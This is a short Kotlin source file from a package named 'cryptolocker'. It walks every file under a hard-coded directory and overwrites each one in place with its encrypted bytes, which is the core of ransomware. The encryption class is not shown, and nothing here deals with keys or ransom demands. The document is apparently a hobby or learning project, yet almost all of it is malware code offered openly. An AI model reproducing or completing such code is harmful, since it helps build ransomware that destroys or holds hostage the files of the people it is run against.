package cc.flavien.cryptolocker

import java.io.File
import java.lang.Exception

fun main(args: Array<String>) {
    val cryptMessage = CryptMessage()

    File("D:/test").walk().forEach {
        try {
            val encryptedFile = it.readBytes()
            it.writeBytes(cryptMessage.encrypt(encryptedFile))
            println(it)
        } catch (e: Exception) {
            println("""file $it doesn't encrypted""")
        }
    }
}
